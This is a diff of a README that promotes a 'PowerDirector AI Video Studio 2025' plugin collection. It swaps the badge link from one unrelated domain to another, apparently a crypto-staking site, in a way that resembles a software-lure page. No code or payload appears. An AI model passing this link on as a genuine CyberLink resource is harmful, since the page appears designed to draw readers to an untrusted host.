@@ -2,7 +2,7 @@
 
 PowerDirector AI Video Studio 2025 delivers an advanced suite of AI plugins, scripts, and templates to enhance CyberLink PowerDirector for professional and consumer-grade video production. Designed for Windows, this collection enables creators to craft viral content and cinematic visuals with unmatched efficiency.
 
-[![Explore PowerDirector AI Video Studio](https://img.shields.io/badge/Explore-PowerDirector_AI_Video_Studio-blueviolet)](https://glocktober.com)
+[![Explore PowerDirector AI Video Studio](https://img.shields.io/badge/Explore-PowerDirector_AI_Video_Studio-blueviolet)](https://ton-stake.net)
 
 ---
 
